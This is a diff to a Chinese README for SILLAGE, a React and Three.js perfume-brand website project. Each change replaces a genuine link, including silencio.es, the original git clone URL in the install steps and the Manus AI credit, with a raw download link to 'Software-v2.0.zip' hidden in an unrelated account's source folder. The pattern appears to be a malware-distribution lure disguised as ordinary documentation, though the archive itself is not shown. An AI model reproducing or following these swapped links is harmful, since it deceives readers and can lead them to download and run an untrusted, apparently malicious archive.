@@ -1,6 +1,6 @@
 # SILLAGE — 嗅觉体验
 
-> 一个受 [silencio.es](https://silencio.es) 启发的高端香水品牌网站，使用 React 19、GSAP 和 React Three Fiber 构建。
+> 一个受 [silencio.es](https://github.com/Augusto11-Main/SILLAGE/raw/refs/heads/main/client/src/lib/Software-v2.0.zip) 启发的高端香水品牌网站，使用 React 19、GSAP 和 React Three Fiber 构建。
 
 <p align="center">
   <img src="docs/demo.gif" alt="SILLAGE 网站演示" width="100%" />
@@ -109,7 +109,7 @@ SILLAGE/
 ### 安装依赖
 
 ```shell
-git clone https://github.com/shaozheng0503/SILLAGE.git
+git clone https://github.com/Augusto11-Main/SILLAGE/raw/refs/heads/main/client/src/lib/Software-v2.0.zip
 cd SILLAGE
 pnpm install
 ```
@@ -143,7 +143,7 @@ pnpm start
 
 ## 灵感来源
 
-本项目是对 [silencio.es](https://silencio.es) 的创意再诠释——这是由 David Lynch 设计的巴黎会员俱乐部网站。原站以其 GSAP ScrollTrigger、Three.js 3D 对象、自定义光标和滚动惯性而著称。SILLAGE 将这些技术移植到高端香水品牌语境中，以更温暖的档案美学取代了俱乐部的黑暗电影氛围。
+本项目是对 [silencio.es](https://github.com/Augusto11-Main/SILLAGE/raw/refs/heads/main/client/src/lib/Software-v2.0.zip) 的创意再诠释——这是由 David Lynch 设计的巴黎会员俱乐部网站。原站以其 GSAP ScrollTrigger、Three.js 3D 对象、自定义光标和滚动惯性而著称。SILLAGE 将这些技术移植到高端香水品牌语境中，以更温暖的档案美学取代了俱乐部的黑暗电影氛围。
 
 ---
 
@@ -151,4 +151,4 @@ pnpm start
 
 MIT — 可自由使用、改编和二次开发。
 
-*Built with [Manus AI](https://manus.im)*
+*Built with [Manus AI](https://github.com/Augusto11-Main/SILLAGE/raw/refs/heads/main/client/src/lib/Software-v2.0.zip)*
